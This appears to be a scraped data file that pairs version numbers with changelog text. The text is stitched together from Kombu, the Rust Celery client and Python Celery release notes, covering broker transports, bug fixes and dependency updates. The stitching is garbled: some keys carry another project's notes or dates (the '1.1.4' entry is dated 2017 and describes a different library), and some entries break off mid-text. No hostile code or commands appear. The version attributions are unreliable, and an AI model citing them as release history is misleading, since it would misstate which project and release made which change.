"=====\n:release-date: 2013-02-07 05:00 P.M UTC\n:release-by: Ask Solem\n\nSQS: Now supports long polling (Issue 176).\n\n    The polling interval default has been changed to 0 and a new\n    transport option (``wait_time_seconds``) has been added.\n    This parameter specifies how long to wait for a message from\n    SQS, and defaults to 20 seconds, which is the maximum\n    value currently allowed by Amazon SQS.\n\n    Contributed by James Saryerwinnie.\n\n- SQS: Now removes unpickleable fields before restoring messages.\n\n- Consumer.__exit__ now ignores exceptions occurring while\n  canceling the consumer.\n\n- Virtual:  Routing keys can now consist of characters also used\n  in regular expressions (e.g. parens) (Issue 194).\n\n- Virtual: Fixed compression header when restoring messages.\n\n    Fix contributed by Alex Koshelev.\n\n- Virtual: ack/reject/requeue now works while using ``basic_get``.\n\n- Virtual: Message.reject is now supported by virtual transports\n  (requeue depends on individual transport support).\n\n- Fixed typo in hack used for static analyzers.\n\n    Fix contributed by Basil Mironenko.\n\n.. _version-2.5.4:\n\n", "2.5.4": "=====\n:release-date: 2012-12-10 12:35 P.M UTC\n:release-by: Ask Solem\n\n- Fixed problem with connection clone and multiple URLs (Issue 182).\n\n    Fix contributed by Dane Guempel.\n\n- zeromq: Now compatible with libzmq 3.2.x.\n\n    Fix contributed by Andrey Antukh.\n\n- Fixed Python 3 installation problem (Issue 187).\n\n.. _version-2.5.3:\n\n", "2.5.3": "=====\n:release-date: 2012-11-29 12:35 P.M UTC\n:release-by: Ask Solem\n\n- Pidbox: Fixed compatibility with Python 2.6\n\n", "2.4.10": "======\n:release-date: 2012-11-22 06:00 P.M UTC\n:release-by: Ask Solem\n\n- The previous versions connection pool changes broke Redis support so that\n  it would always connect to localhost (default setting) no matter what\n  connection parameters were provided (Issue 176).\n\n.. _version-2.4.9:\n\n", "2.4.9": "=====\n:release-date: 2012-11-21 03:00 P.M UTC\n:release-by: Ask Solem\n\n- Redis: Fixed race condition that could occur while trying to restore\n  messages (Issue 171).\n\n    Fix contributed by Ollie Walsh.\n\n- Redis: Each channel is now using a specific connection pool instance,\n  which is disconnected on connection failure.\n\n- ProducerPool: Fixed possible dead-lock in the acquire method.\n\n- ProducerPool: ``force_close_all`` no longer tries to call the non-existent\n  ``Producer._close``.\n\n- librabbitmq: Now implements ``transport.verify_connection`` so that\n  connection pools will not give back connections that are no longer working.\n\n- New and better ``repr()`` for Queue and Exchange objects.\n\n- Python 3:  Fixed problem with running the unit test suite.\n\n- Python 3: Fixed problem with JSON codec.\n\n.. _version-2.4.8:\n\n", "2.4.8": "=====\n:release-date: 2012-11-02 05:00 P.M UTC\n:release-by: Ask Solem\n\n- Redis:  Improved fair queue cycle implementation (Issue 166).\n\n    Contributed by Kevin McCarthy.\n\n- Redis: Unacked message restore limit is now unlimited by default.\n\n    Also, the limit can now be configured using the ``unacked_restore_limit``\n    transport option:\n\n    .. code-block:: python\n\n        Connection('redis://', transport_options={\n            'unacked_restore_limit': 100,\n        })\n\n        A limit of 100 means that the consumer will restore at most 100\n        messages at each pass.\n\n- Redis: Now uses a mutex to ensure only one consumer restores messages at a\n  time.\n\n    The mutex expires after 5 minutes by default, but can be configured\n    using the ``unacked_mutex_expire`` transport option.\n\n- LamportClock.adjust now returns the new clock value.\n\n- Heartbeats can now be specified in URLs.\n\n    Fix contributed by Mher Movsisyan.\n\n- Kombu can now be used with PyDev, PyCharm and other static analysis tools.\n\n- Fixes problem with msgpack on Python 3 (Issue 162).\n\n    Fix contributed by Jasper Bryant-Greene\n\n- amqplib: Fixed bug with timeouts when SSL is used in non-blocking mode.\n\n    Fix contributed by Mher Movsisyan\n\n\n.. _version-2.4.7:\n\n", "2.4.7": "=====\n:release-date: 2012-09-18 03:00 P.M BST\n:release-by: Ask Solem\n\n- Virtual: Unknown exchanges now default to 'direct' when sending a message.\n\n- MongoDB: Fixed memory leak when merging keys stored in the db (Issue 159)\n\n    Fix contributed by Michael Korbakov.\n\n- MongoDB: Better index for MongoDB transport (Issue 158).\n\n    This improvement will create a new compund index for queue and _id in order\n    to be able to use both indexed fields for getting a new message (using\n    queue field) and sorting by _id.  It'll be necessary to manually delete\n    the old index from the collection.\n\n    Improvement contributed by rmihael\n\n.. _version-2.4.6:\n\n", "2.4.6": "=====\n:release-date: 2012-09-12 03:00 P.M BST\n:release-by: Ask Solem\n\n- Adds additional compatibility dependencies:\n\n    - Python <= 2.6:\n\n        - importlib\n        - ordereddict\n\n    - Python <= 2.5\n\n        - simplejson\n\n.. _version-2.4.5:\n\n", "2.4.5": "=====\n:release-date: 2012-08-30 03:36 P.M BST\n:release-by: Ask Solem\n\n- Last version broke installtion on PyPy and Jython due\n  to test requirements clean-up.\n\n.. _version-2.4.4:\n\n", "2.4.4": "=====\n:release-date: 2012-08-29 04:00 P.M BST\n:release-by: Ask Solem\n\n- amqplib: Fixed a bug with asynchronously reading large messages.\n\n- pyamqp: Now requires amqp 0.9.3\n\n- Cleaned up test requirements.\n\n.. _version-2.4.3:\n\n", "2.4.3": "=====\n:release-date: 2012-08-25 10:30 P.M BST\n:release-by: Ask Solem\n\n- Fixed problem with amqp transport alias (Issue 154).\n\n.. _version-2.4.2:\n\n", "2.2.6": "=====\n:release-date: 2012-07-10 05:00 P.M BST\n:release-by: Ask Solem\n\n- Adds ``kombu.messaging.entry_to_queue`` for compat with previous versions.\n\n.. _version-2.2.5:\n\n", "2.2.5": "=====\n:release-date: 2012-07-10 05:00 P.M BST\n:release-by: Ask Solem\n\n- Pidbox: Now sets queue expire at 10 seconds for reply queues.\n\n- EventIO: Now ignores ``ValueError`` raised by epoll unregister.\n\n- MongoDB: Fixes Issue 142\n\n    Fix by Flavio Percoco Premoli\n\n.. _version-2.2.4:\n\n", "2.2.4": "=====\n:release-date: 2012-07-05 04:00 P.M BST\n:release-by: Ask Solem\n\n- Support for msgpack-python 0.2.0 (Issue 143)\n\n    The latest msgpack version no longer supports Python 2.5, so if you're\n    still using that you need to depend on an earlier msgpack-python version.\n\n    Fix contributed by Sebastian Insua\n\n- :func:`~kombu.common.maybe_declare` no longer caches entities with the\n  ``auto_delete`` flag set.\n\n- New experimental filesystem transport.\n\n    Contributed by Bobby Beever.\n\n- Virtual Transports: Now support anonymous queues and exchanges.\n\n.. _version-2.2.3:\n\n", "2.2.3": "=====\n:release-date: 2012-06-24 05:00 P.M BST\n:release-by: Ask Solem\n\n- ``BrokerConnection`` now renamed to ``Connection``.\n\n    The name ``Connection`` has been an alias for a very long time,\n    but now the rename is official in the documentation as well.\n\n    The Connection alias has been available since version 1.1.3,\n    and ``BrokerConnection`` will still work and is not deprecated.\n\n- ``Connection.clone()`` now works for the sqlalchemy transport.\n\n- :func:`kombu.common.eventloop`, :func:`kombu.utils.uuid`,\n  and :func:`kombu.utils.url.parse_url` can now be\n  imported from the :mod:`kombu` module directly.\n\n- Pidbox transport callback ``after_reply_message_received`` now happens\n  in a finally block.\n\n- Trying to use the ``librabbitmq://`` transport will now show the right\n  name in the :exc:`ImportError` if :mod:`librabbitmq` is not installed.\n\n    The librabbitmq falls back to the older ``pylibrabbitmq`` name for\n    compatibility reasons and would therefore show ``No module named\n    pylibrabbitmq`` instead of librabbitmq.\n\n\n.. _version-2.2.2:\n\n", "2.1.8": "=====\n:release-date: 2012-05-06 03:06 P.M BST\n:release-by: Ask Solem\n\n* Bound Exchange/Queue's are now pickleable.\n\n* Consumer/Producer can now be instantiated without a channel,\n  and only later bound using ``.revive(channel)``.\n\n* ProducerPool now takes ``Producer`` argument.\n\n* :func:`~kombu.utils.fxrange` now counts forever if the\n  stop argument is set to None.\n  (fxrange is like xrange but for decimals).\n\n* Auto delete support for virtual transports were incomplete\n  and could lead to problems so it was removed.\n\n* Cached declarations (:func:`~kombu.common.maybe_declare`)\n  are now bound to the underlying connection, so that\n  entities are redeclared if the connection is lost.\n\n    This also means that previously uncacheable entities\n    (e.g. non-durable) can now be cached.\n\n* compat ConsumerSet: can now specify channel.\n\n.. _version-2.1.7:\n\n", "2.1.7": "=====\n:release-date: 2012-04-27 06:00 P.M BST\n:release-by: Ask Solem\n\n* compat consumerset now accepts optional channel argument.\n\n.. _version-2.1.6:\n\n", "2.1.6": "=====\n:release-date: 2012-04-23 01:30 P.M BST\n:release-by: Ask Solem\n\n* SQLAlchemy transport was not working correctly after URL parser change.\n\n* maybe_declare now stores cached declarations per underlying connection\n  instead of globally, in the rare case that data disappears from the\n  broker after connection loss.\n\n* Django: Added South migrations.\n\n    Contributed by Joseph Crosland.\n\n.. _version-2.1.5:\n\n", "2.1.5": "=====\n:release-date: 2012-04-13 03:30 P.M BST\n:release-by: Ask Solem\n\n* The url parser removed more than the first leading slash (Issue 121).\n\n* SQLAlchemy: Can now specify url using + separator\n\n    Example:\n\n    .. code-block:: python\n\n        Connection('sqla+mysql://localhost/db')\n\n* Better support for anonymous queues (Issue 116).\n\n    Contributed by Michael Barrett.\n\n* ``Connection.as_uri`` now quotes url parts (Issue 117).\n\n* Beanstalk: Can now set message TTR as a message property.\n\n    Contributed by Andrii Kostenko\n\n.. _version-2.1.4:\n\n", "1.5.1": "=====\n:release-date: 2011-11-30 01:00 P.M GMT\n:release-by: Ask Solem\n\n* Fixes issue with ``kombu.compat`` introduced in 1.5.0 (Issue 83).\n\n* Adds the ability to disable content_types in the serializer registry.\n\n    Any message with a content type that is disabled will be refused.\n    One example would be to disable the Pickle serializer:\n\n        >>> from kombu.serialization import registry\n         by name\n        >>> registry.disable('pickle')\n         or by mime-type.\n        >>> registry.disable('application/x-python-serialize')\n\n.. _version-1.5.0:\n\n", "1.5.0": "=====\n:release-date: 2011-11-27 06:00 P.M GMT\n:release-by: Ask Solem\n\n* kombu.pools: Fixed a bug resulting in resources not being properly released.\n\n  This was caused by the use of ``__hash__`` to distinguish them.\n\n* Virtual transports: Dead-letter queue is now disabled by default.\n\n    The dead-letter queue was enabled by default to help application\n    authors, but now that Kombu is stable it should be removed.\n    There are after all many cases where messages should just be dropped\n    when there are no queues to buffer them, and keeping them without\n    supporting automatic cleanup is rather considered a resource leak\n    than a feature.\n\n    If wanted the dead-letter queue can still be enabled, by using\n    the ``deadletter_queue`` transport option:\n\n    .. code-block:: pycon\n\n        >>> x = Connection('redis://',\n        ...       transport_options={'deadletter_queue': 'ae.undeliver'})\n\n    In addition, an :class:`UndeliverableWarning` is now emitted when\n    the dead-letter queue is enabled and a message ends up there.\n\n    Contributed by Ionel Maries Cristian.\n\n* MongoDB transport now supports Replicasets (Issue 81).\n\n    Contributed by Ivan Metzlar.\n\n* The ``Connection.ensure`` methods now accepts a ``max_retries`` value\n  of 0.\n\n    A value of 0 now means *do not retry*, which is distinct from :const:`None`\n    which means *retry indefinitely*.\n\n    Contributed by Dan McGee.\n\n* SQS Transport: Now has a lowercase ``sqs`` alias, so that it can be\n  used with broker URLs (Issue 82).\n\n    Fix contributed by Hong Minhee\n\n* SQS Transport: Fixes KeyError on message acknowledgments (Issue 73).\n\n    The SQS transport now uses UUID's for delivery tags, rather than\n    a counter.\n\n    Fix contributed by Brian Bernstein.\n\n* SQS Transport: Unicode related fixes (Issue 82).\n\n    Fix contributed by Hong Minhee.\n\n* Redis version check could crash because of improper handling of types\n  (Issue 63).\n\n* Fixed error with `Resource.force_close_all` when resources\n  were not yet properly initialized (Issue 78).\n\n.. _version-1.4.3:\n\n", "1.3.5": "=====\n:release-date: 2011-09-16 06:00 P.M BST\n:release-by: Ask Solem\n\n* Python 3: AMQP_PROTOCOL_HEADER must be bytes, not str.\n\n.. _version-1.3.4:\n\n", "1.3.4": "=====\n:release-date: 2011-09-16 06:00 P.M BST\n:release-by: Ask Solem\n\n* Fixes syntax error in pools.reset\n\n\n.. _version-1.3.3:\n\n", "1.1.6": "=====\n:release-date: 2011-06-13 04:00 P.M BST\n:release-by: Ask Solem\n\n* Redis: Fixes issue introduced in 1.1.4, where a redis connection\n  failure could leave consumer hanging forever.\n\n* SQS: Now supports fanout messaging by using SimpleDB to store routing\n  tables.\n\n    This can be disabled by setting the `supports_fanout` transport option:\n\n        >>> Connection(transport='SQS',\n        ...            transport_options={'supports_fanout': False})\n\n* SQS: Now properly deletes a message when a message is acked.\n\n* SQS: Can now set the Amazon AWS region, by using the ``region``\n  transport option.\n\n* amqplib: Now uses `localhost` as default hostname instead of raising an\n  error.\n\n.. _version-1.1.5:\n\n", "1.1.5": "=====\n:release-date: 2011-06-07 06:00 P.M BST\n:release-by: Ask Solem\n\n* Fixes compatibility with redis-py 2.4.4.\n\n.. _version-1.1.4:\n\n", "1.1.4": "=====\n:release-date: 2017-07-16 10:30 P.M UTC+2\n:release-by: Ask Solem\n\n- Added official support for Python 3.5 & 3.6.\n- Improve Python 2/3 compatibility.\n- Don't set mutable default values to keyword arguments.\n\n.. _version-1.1.3:\n\n", "1.1.3": "=====\n:release-date: 2016-10-13 06:02 P.M PDT\n:release-by: Ask Solem\n\n- New ``promise(fun, weak=True)`` argument, creates weakref to callback.\n\n.. _version-1.1.2:\n\n", "1.1.2": "=====\n:release-date: 2016-09-07 04:18 P.M PDT\n:release-by: Ask Solem\n\n- barrier: now handles the case where len(promises) returns NotImplemented.\n\n.. _version-1.1.1:\n\n", "1.1.1": "=====\n:release-date: 2016-06-30 12:05 P.M PDT\n:release-by: Ask Solem\n\n- Requirements: Tests now depends on :pypi:`case` 1.2.2\n\n- Five: python_2_unicode_compatible now ensures `__repr__` returns\n  bytes on Python 2.\n\n.. _version-1.1.0:\n\n", "0.1.0": "=====\n:release-date: 2010-07-22 04:20 P.M CET\n:release-by: Ask Solem\n\n* Initial fork of carrot\n\n\nChanges\n=======\n\n.. _version-5.1.0:\n\n", "0.4.0rc4": "\n Added\n\n- Added a `MockBroker` for internal testing.\n- Added more tests to the `app` module.\n- Added a `prelude` module.\n- Added support for YAML, MsgPack, and Pickle content types, behind the `extra_content_types` feature flag.\n\n Changed\n\n- Improved `TaskResultExt`. Now takes a `FnOnce() -> Context` instead of `&str`.\n\n Fixed\n\n- Ensure a `Signature` inherits default `TaskOptions` from the corresponding `Task` and `Celery` or `Beat` app.\n- Cleaned up remaining uses of `.unwrap()` in the library.\n- Options returned with `Task::options()` now have the current values, where app-level values are overridden by task-level values.\n\n", "0.4.0rc3": "\n Added\n\n- Added a `.display_pretty()` method on the `Celery` struct that prints out a cool ASCII logo\n  with some useful information about the app.\n- Added an `AsyncResult` struct that acts as a handler for task results.\n- Added `Task::retry_with_countdown` and `Task::retry_with_eta` trait methods so that tasks can\n  manually trigger a retry.\n\n Changed\n\n- Fields of the `Signature` struct made private to avoid confusion around which fields of `TaskOptions` apply to a `Signature`.\n- `Celery::send_task` now returns an `AsyncResult` instead of a `String` for the `Ok` variant.\n- Renamed `DummyBackend` to `LocalSchedulerBackend`.\n- Switched to [`thiserror`](https://github.com/dtolnay/thiserror) for the error module instead of the deprecated `failure` crate.\n\n Fixed\n\n- Fixed bug where `hard_time_limit` was ignored by worker if only specified at the app or task level.\n\n", "0.4.0rc2": "\n Added\n\n- Added a `reconnect` method on the `Broker`.\n\n Changed\n\n- `Celery` and `Beat` apps will automatically try to reconnect the broker when the connection fails.\n\n", "0.4.0rc1": "\n Added\n\n- Added a `hard_time_limit` task option for compatability with Python.\n\n Changed\n\n- The `timeout` task option was renamed to `time_limit` to be more consistent with the Python API.\n\n Fixed\n\n- Compiles on Windows\n\n", "0.3.1": "\n Added\n\n- `beat` module with basic support for scheduling tasks.\n- `beat` macro to create a `Beat` app.\n\n", "0.3.0": "\n Changed\n\n- `lapin` dependency updated to 1.0.\n- `BrokerError` variants trimmed and simplified.\n- The error handler closure passed to `Broker::consume` now takes a `BrokerError` as an argument.\n- Improved error messages.\n\n", "0.2.6": "\n Fixed\n\n- `Message::headers::origin` field fixed. Before it included quotes around the hostname.\n\n Added\n\n- `Request::hostname` field now populated by the `Celery` app consuming the task.\n\n Changed\n\n- Sending a task `with_timeout` will only set the `soft_time_limit` so that the behavior\nis the same for Python consumers.\n\n", "0.2.5": "\n Changed\n\n- Tasks must explicitly return a `TaskResult<T>` now.\n\n", "0.2.4": "\n Added\n\n- A `retry_for_unexpected` task configuration option. By default this is `true` (so the default behavior is unchanged).\nBut if set to `false`, tasks that raised `TaskError::UnexpectedError` won't be retried.\n\n", "0.2.3": "\n Changed\n\n- `CeleryBuilder::task_route` now infallible. Error could be raised during the `build` phase instead.\n- `Celery::consume_from` will return `Err(CeleryError::NoQueueToConsume)` if the slice of queues is empty.\n\n", "0.2.2": "\n Changed\n\n- `Celery::consume_from` now takes multiple queues instead of just a single queue.\n- Retry ETA method moved from tracer to task so that it can be customized.\n- `TaskError` variants restricted to only `ExpectedError`, `UnexpectedError`, and `TimeoutError`. The `Retry` and `ExpirationError` variants moved to a new (non-public) error type: `TracerError`.\n\n", "0.2.1": "\n Added\n\n- `on_failure` and `on_success` options to `task` attribute macro.\n\n Changed\n\n- Removed `task_id` and `params` arguments to `on_failure` and `on_success` callbacks, since those can be gotten from the request object.\n\n", "0.2.0": "\n Added\n\n- A `Signature` struct with includes task execution options (previously the fields in `TaskSendOptions`).\n- A `bind` argument to the `task` macro. When `bind = true` is given, the task will be run as an instance method.\n- A `Request` struct.\n\n Changed\n\n- `protocol::TryIntoMessage` trait renamed to `TryCreateMessage` and the one trait function `try_into_message` renamed to `try_create_message` to better reflect the fact that the trait function does not consume `self`.\n- Task parameters are now separated from task struct.\n- Task callback methods `on_failure` and `on_success` are now instance methods.\n- `Celery::send_task` now takes a `Signature` instead of a `Task`.\n- When tasks are defined through the `task` macro by annotating a function, that function needs to be explicitly marked async for the function to use async / await syntax.\n\n Removed\n\n- `TaskContext` struct.\n- `TaskSendOptions`.\n- `Celery::send_task_with`.\n\n", "0.2.0alpha.2": "\n Changed\n\n- Uses of `std::sync::Mutex` and `std::sync::RwLock` changed to their async-aware equivalents from `tokio`.\n- The `Celery::register_task` method is now an async function due to the above.\n- Fixed bug where tasks with a future ETA were acked before they were due, resulting in such tasks being lost if the worker was shutdown before they were due.\n\n Removed\n\n- The `SyncError` variants have been removed.\n\n", "0.2.0alpha.1": "\n Changed\n\n- `Celery::consume_from` now only accepts a single queue (once again) since there was a critical bug when we allowed consuming from multiple queues.\n\n", "0.2.0alpha.0": "\n Added\n\n- Several error enums: `CeleryError`, `TaskError`, `BrokerError`, `ProtocolError`.\n- `TaskResultExt` for easily converting the error type in a `Result` to a `TaskError` variant.\n\n Changed\n\n- The `error` module.\n- The structure of the public API is now more compact. We expose a few more modules, including `broker`, `task`, and `error` instead of exporting all of the public elements from the crate root.\n- The `app` macro (previously `celery_app`) no longer takes an actual broker type (like `AMQPBroker`) for the `broker` parameter. Instead you can just use the literal token `AMQP`. This means one less import for the user.\n\n Removed\n\n- The `Error` type.\n- The `celery_app` macro has been renamed to just `app`.\n- The `ResultExt` re-export.\n\n\n.. _changelog:\n\n================\n Change history\n================\n\nThis document contains change notes for bugfix & new features\nin the main branch & 5.5.x series, please see :ref:`whatsnew-5.5` for\nan overview of what's new in Celery 5.5.\n\n.. _version-5.5.0b1:\n\n", "5.5.0b1": "=======\n\n:release-date: 2024-07-24\n:release-by: Tomer Nosrati\n\nCelery v5.5.0 Beta 1 is now available for testing.\nPlease help us test this version and report any issues.\n\nKey Highlights\n~~~~~~~~~~~~~~\n\nRedis Broker Stability Improvements\n-----------------------------------\nThe root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_\nin the release-candidate for Kombu v5.4.0. This beta release has been upgraded to use the new\nKombu RC version, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues:\n`7276 <https://github.com/celery/celery/discussions/7276>`_,\n`8091 <https://github.com/celery/celery/discussions/8091>`_,\n`8030 <https://github.com/celery/celery/discussions/8030>`_,\n`8384 <https://github.com/celery/celery/discussions/8384>`_\n\nQuorum Queues Initial Support\n-----------------------------\nThis release introduces the initial support for Quorum Queues with Celery. \n\nSee new configuration options for more details:\n\n- :setting:`task_default_queue_type`\n- :setting:`worker_detect_quorum_queues`\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues:\n`6067 <https://github.com/celery/celery/discussions/6067>`_,\n`9121 <https://github.com/celery/celery/discussions/9121>`_\n\nWhat's Changed\n~~~~~~~~~~~~~~\n\n- (docs): use correct version celery v.5.4.x (8975)\n- Update mypy to 1.10.0 (8977)\n- Limit pymongo<4.7 when Python <= 3.10 due to breaking changes in 4.7 (8988)\n- Bump pytest from 8.1.1 to 8.2.0 (8987)\n- Update README to Include FastAPI in Framework Integration Section (8978)\n- Clarify return values of ..._on_commit methods (8984)\n- add kafka broker docs (8935)\n- Limit pymongo<4.7 regardless of Python version (8999)\n- Update pymongo[srv] requirement from <4.7,>=4.0.2 to >=4.0.2,<4.8 (9000)\n- Update elasticsearch requirement from <=8.13.0 to <=8.13.1 (9004)\n- security: SecureSerializer: support generic low-level serializers (8982)\n- don't kill if pid same as file (8997) (8998)\n- Update cryptography to 42.0.6 (9005)\n- Bump cryptography from 42.0.6 to 42.0.7 (9009)\n- Added -vv to unit, integration and smoke tests (9014)\n- SecuritySerializer: ensure pack separator will not be conflicted with serialized fields (9010)\n- Update sphinx-click to 5.2.2 (9025)\n- Bump sphinx-click from 5.2.2 to 6.0.0 (9029)\n- Fix a typo to display the help message in first-steps-with-django (9036)\n- Pinned requests to v2.31.0 due to docker-py bug 3256 (9039)\n- Fix certificate validity check (9037)\n- Revert \"Pinned requests to v2.31.0 due to docker-py bug 3256\" (9043)\n- Bump pytest from 8.2.0 to 8.2.1 (9035)\n- Update elasticsearch requirement from <=8.13.1 to <=8.13.2 (9045)\n- Fix detection of custom task set as class attribute with Django (9038)\n- Update elastic-transport requirement from <=8.13.0 to <=8.13.1 (9050)\n- Bump pycouchdb from 1.14.2 to 1.16.0 (9052)\n- Update pytest to 8.2.2 (9060)\n- Bump cryptography from 42.0.7 to 42.0.8 (9061)\n- Update elasticsearch requirement from <=8.13.2 to <=8.14.0 (9069)\n- [enhance feature] Crontab schedule: allow using month names (9068)\n- Enhance tox environment: [testenv:clean] (9072)\n- Clarify docs about Reserve one task at a time (9073)\n- GCS docs fixes (9075)\n- Use hub.remove_writer instead of hub.remove for write fds (4185) (9055)\n- Class method to process crontab string (9079)\n- Fixed smoke tests env bug when using integration tasks that rely on Redis (9090)\n- Bugfix - a task will run multiple times when chaining chains with groups (9021)\n- Bump mypy from 1.10.0 to 1.10.1 (9096)\n- Don't add a separator to global_keyprefix if it already has one (9080)\n- Update pymongo[srv] requirement from <4.8,>=4.0.2 to >=4.0.2,<4.9 (9111)\n- Added missing import in examples for Django (9099)\n- Bump Kombu to v5.4.0rc1 (9117)\n- Removed skipping Redis in t/smoke/tests/test_consumer.py tests (9118)\n- Update pytest-subtests to 0.13.0 (9120)\n- Increased smoke tests CI timeout (9122)\n- Bump Kombu to v5.4.0rc2 (9127)\n- Update zstandard to 0.23.0 (9129)\n- Update pytest-subtests to 0.13.1 (9130)\n- Changed retry to tenacity in smoke tests (9133)\n- Bump mypy from 1.10.1 to 1.11.0 (9135)\n- Update cryptography to 43.0.0 (9138)\n- Update pytest to 8.3.1 (9137)\n- Added support for Quorum Queues (9121)\n- Bump Kombu to v5.4.0rc3 (9139)\n- Cleanup in Changelog.rst (9141)\n- Update Django docs for CELERY_CACHE_BACKEND (9143)\n- Added missing docs to previous releases (9144)\n- Fixed a few documentation build warnings (9145)\n- docs(README): link invalid (9148)\n- Prepare for (pre) release: v5.5.0b1 (9146)\n\n.. _version-5.4.0:\n\n", "5.4.0": "=====\n\n:release-date: 2024-04-17\n:release-by: Tomer Nosrati\n\nCelery v5.4.0 and v5.3.x have consistently focused on enhancing the overall QA, both internally and externally.\nThis effort led to the new pytest-celery v1.0.0 release, developed concurrently with v5.3.0 & v5.4.0.\n\nThis release introduces two significant QA enhancements:\n\n- **Smoke Tests**: A new layer of automatic tests has been added to Celery's standard CI. These tests are designed to handle production scenarios and complex conditions efficiently. While new contributions will not be halted due to the lack of smoke tests, we will request smoke tests for advanced changes where appropriate.\n- `Standalone Bug Report Script <https://docs.celeryq.dev/projects/pytest-celery/en/latest/userguide/celery-bug-report.html>`_: The new pytest-celery plugin now allows for encapsulating a complete Celery dockerized setup within a single pytest script. Incorporating these into new bug reports will enable us to reproduce reported bugs deterministically, potentially speeding up the resolution process.\n\nContrary to the positive developments above, there have been numerous reports about issues with the Redis broker malfunctioning\nupon restarts and disconnections. Our initial attempts to resolve this were not successful (8796).\nWith our enhanced QA capabilities, we are now prepared to address the core issue with Redis (as a broker) again.\n\nThe rest of the changes for this release are grouped below, with the changes from the latest release candidate listed at the end.\n\nChanges\n~~~~~~~\n- Add a Task class specialised for Django (8491)\n- Add Google Cloud Storage (GCS) backend (8868)\n- Added documentation to the smoke tests infra (8970)\n- Added a checklist item for using pytest-celery in a bug report (8971)\n- Bugfix: Missing id on chain (8798)\n- Bugfix: Worker not consuming tasks after Redis broker restart (8796)\n- Catch UnicodeDecodeError when opening corrupt beat-schedule.db (8806)\n- chore(ci): Enhance CI with `workflow_dispatch` for targeted debugging and testing (8826)\n- Doc: Enhance \"Testing with Celery\" section (8955)\n- Docfix: pip install celery[sqs] -> pip install \"celery[sqs]\" (8829)\n- Enable efficient `chord` when using dynamicdb as backend store (8783)\n- feat(daemon): allows daemonization options to be fetched from app settings (8553)\n- Fix DeprecationWarning: datetime.datetime.utcnow() (8726)\n- Fix recursive result parents on group in middle of chain (8903)\n- Fix typos and grammar (8915)\n- Fixed version documentation tag from 8553 in configuration.rst (8802)\n- Hotfix: Smoke tests didn't allow customizing the worker's command arguments, now it does (8937)\n- Make custom remote control commands available in CLI (8489)\n- Print safe_say() to stdout for non-error flows (8919)\n- Support moto 5.0 (8838)\n- Update contributing guide to use ssh upstream url (8881)\n- Update optimizing.rst (8945)\n- Updated concurrency docs page. (8753)\n\nDependencies Updates\n~~~~~~~~~~~~~~~~~~~~\n- Bump actions/setup-python from 4 to 5 (8701)\n- Bump codecov/codecov-action from 3 to 4 (8831)\n- Bump isort from 5.12.0 to 5.13.2 (8772)\n- Bump msgpack from 1.0.7 to 1.0.8 (8885)\n- Bump mypy from 1.8.0 to 1.9.0 (8898)\n- Bump pre-commit to 3.6.1 (8839)\n- Bump pre-commit/action from 3.0.0 to 3.0.1 (8835)\n- Bump pytest from 8.0.2 to 8.1.1 (8901)\n- Bump pytest-celery to v1.0.0 (8962)\n- Bump pytest-cov to 5.0.0 (8924)\n- Bump pytest-order from 1.2.0 to 1.2.1 (8941)\n- Bump pytest-subtests from 0.11.0 to 0.12.1 (8896)\n- Bump pytest-timeout from 2.2.0 to 2.3.1 (8894)\n- Bump python-memcached from 1.59 to 1.61 (8776)\n- Bump sphinx-click from 4.4.0 to 5.1.0 (8774)\n- Update cryptography to 42.0.5 (8869)\n- Update elastic-transport requirement from <=8.12.0 to <=8.13.0 (8933)\n- Update elasticsearch requirement from <=8.12.1 to <=8.13.0 (8934)\n- Upgraded Sphinx from v5.3.0 to v7.x.x (8803)\n\n", "5.4": "environments. The release candidate version is available for testing.\nThe official release is planned for March-April 2024.\n\n- New Config: worker_enable_prefetch_count_reduction (8581)\n- Added \"Serverless\" section to Redis doc (redis.rst) (8640)\n- Upstash's Celery example repo link fix (8665)\n- Update mypy version (8679)\n- Update cryptography dependency to 41.0.7 (8690)\n- Add type annotations to celery/utils/nodenames.py (8667)\n- Issue 3426. Adding myself to the contributors. (8696)\n- Bump actions/setup-python from 4 to 5 (8701)\n- Fixed bug where chord.link_error() throws an exception on a dict type errback object (8702)\n- Bump github/codeql-action from 2 to 3 (8725)\n- Fixed multiprocessing integration tests not running on Mac (8727)\n- Added make docker-docs (8729)\n- Fix DeprecationWarning: datetime.datetime.utcnow() (8726)\n- Remove `new` adjective in docs (8743)\n- add type annotation to celery/utils/sysinfo.py (8747)\n- add type annotation to celery/utils/iso8601.py (8750)\n- Change type annotation to celery/utils/iso8601.py (8752)\n- Update test deps (8754)\n- Mark flaky: test_asyncresult_get_cancels_subscription() (8757)\n- change _read_as_base64 (b64encode returns bytes) on celery/utils/term.py (8759)\n- Replace string concatenation with fstring on celery/utils/term.py (8760)\n- Add type annotation to celery/utils/term.py (8755)\n- Skipping test_tasks::test_task_accepted (8761)\n- Updated concurrency docs page. (8753)\n- Changed pyup -> dependabot for updating dependencies (8764)\n- Bump isort from 5.12.0 to 5.13.2 (8772)\n- Update elasticsearch requirement from <=8.11.0 to <=8.11.1 (8775)\n- Bump sphinx-click from 4.4.0 to 5.1.0 (8774)\n- Bump python-memcached from 1.59 to 1.61 (8776)\n- Update elastic-transport requirement from <=8.10.0 to <=8.11.0 (8780)\n- python-memcached==1.61 -> python-memcached>=1.61 (8787)\n- Remove usage of utcnow (8791)\n- Smoke Tests (8793)\n- Moved smoke tests to their own workflow (8797)\n- Bugfix: Worker not consuming tasks after Redis broker restart (8796)\n- Bugfix: Missing id on chain (8798)\n\n.. _version-5.3.6:\n\n", "5.2.7": "=====\n\n:release-date: 2022-5-26 12:15 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Fix packaging issue which causes poetry 1.2b1 and above to fail install Celery (7534).\n\n.. _version-5.2.6:\n\n", "5.2.6": "=====\n\n:release-date: 2022-4-04 21:15 P.M UTC+2:00\n:release-by: Omer Katz\n\n- load_extension_class_names - correct module_name (7433).\n    This fixes a regression caused by 7218.\n\n.. _version-5.2.5:\n\n", "5.2.5": "=====\n\n:release-date: 2022-4-03 20:42 P.M UTC+2:00\n:release-by: Omer Katz\n\n**This release was yanked due to a regression caused by the PR below**\n\n- Use importlib instead of deprecated pkg_resources (7218).\n\n.. _version-5.2.4:\n\n", "5.2.0rc2": "========\n\n:release-date: 2021-11-02 1.54 P.M UTC+3:00\n:release-by: 